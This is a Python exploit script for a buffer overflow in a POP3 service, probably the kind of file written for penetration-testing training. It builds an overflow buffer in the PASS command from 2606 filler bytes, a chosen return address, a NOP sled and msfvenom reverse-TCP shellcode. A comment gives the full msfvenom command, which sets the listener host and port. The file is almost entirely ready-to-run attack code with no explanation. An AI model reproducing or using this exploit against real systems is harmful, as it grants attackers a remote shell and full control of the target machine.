#!/usr/bin/env python
import socket

# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.16.124 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d" --arch x86 --platform windows -f c
shellcode = (
"\xda\xd6\xd9\x74\x24\xf4\xbd\x3d\x37\x33\x82\x5a\x33\xc9\xb1"
"\x52\x83\xea\xfc\x31\x6a\x13\x03\x57\x24\xd1\x77\x5b\xa2\x97"
"\x78\xa3\x33\xf8\xf1\x46\x02\x38\x65\x03\x35\x88\xed\x41\xba"
"\x63\xa3\x71\x49\x01\x6c\x76\xfa\xac\x4a\xb9\xfb\x9d\xaf\xd8"
"\x7f\xdc\xe3\x3a\x41\x2f\xf6\x3b\x86\x52\xfb\x69\x5f\x18\xae"
"\x9d\xd4\x54\x73\x16\xa6\x79\xf3\xcb\x7f\x7b\xd2\x5a\x0b\x22"
"\xf4\x5d\xd8\x5e\xbd\x45\x3d\x5a\x77\xfe\xf5\x10\x86\xd6\xc7"
"\xd9\x25\x17\xe8\x2b\x37\x50\xcf\xd3\x42\xa8\x33\x69\x55\x6f"
"\x49\xb5\xd0\x6b\xe9\x3e\x42\x57\x0b\x92\x15\x1c\x07\x5f\x51"
"\x7a\x04\x5e\xb6\xf1\x30\xeb\x39\xd5\xb0\xaf\x1d\xf1\x99\x74"
"\x3f\xa0\x47\xda\x40\xb2\x27\x83\xe4\xb9\xca\xd0\x94\xe0\x82"
"\x15\x95\x1a\x53\x32\xae\x69\x61\x9d\x04\xe5\xc9\x56\x83\xf2"
"\x2e\x4d\x73\x6c\xd1\x6e\x84\xa5\x16\x3a\xd4\xdd\xbf\x43\xbf"
"\x1d\x3f\x96\x10\x4d\xef\x49\xd1\x3d\x4f\x3a\xb9\x57\x40\x65"
"\xd9\x58\x8a\x0e\x70\xa3\x5d\x3b\x8e\xbb\xe1\x53\x92\xbb\x18"
"\x1f\x1b\x5d\x70\x4f\x4a\xf6\xed\xf6\xd7\x8c\x8c\xf7\xcd\xe9"
"\x8f\x7c\xe2\x0e\x41\x75\x8f\x1c\x36\x75\xda\x7e\x91\x8a\xf0"
"\x16\x7d\x18\x9f\xe6\x08\x01\x08\xb1\x5d\xf7\x41\x57\x70\xae"
"\xfb\x45\x89\x36\xc3\xcd\x56\x8b\xca\xcc\x1b\xb7\xe8\xde\xe5"
"\x38\xb5\x8a\xb9\x6e\x63\x64\x7c\xd9\xc5\xde\xd6\xb6\x8f\xb6"
"\xaf\xf4\x0f\xc0\xaf\xd0\xf9\x2c\x01\x8d\xbf\x53\xae\x59\x48"
"\x2c\xd2\xf9\xb7\xe7\x56\x19\x5a\x2d\xa3\xb2\xc3\xa4\x0e\xdf"
"\xf3\x13\x4c\xe6\x77\x91\x2d\x1d\x67\xd0\x28\x59\x2f\x09\x41"
"\xf2\xda\x2d\xf6\xf3\xce"
)

# rets
# 5F4A358F
# 5F4B41E3
# 5F4BF0BB

buffer = 'A'*2606 + '\x8F\x35\x4A\x5F' + "\x90"*16 + shellcode
#buffer = 'A'*2606 + '\xbb\xf0\x4b\x5f' + shellcode

try:
    print "\nSending evil buffer..."
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.11.16.124', 110))
    data = s.recv(1024)
    s.send('USER test\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    s.send('QUIT\r\n')
    s.close()
    print "\nDone!"
except:
    print "Could not connect to POP3!"


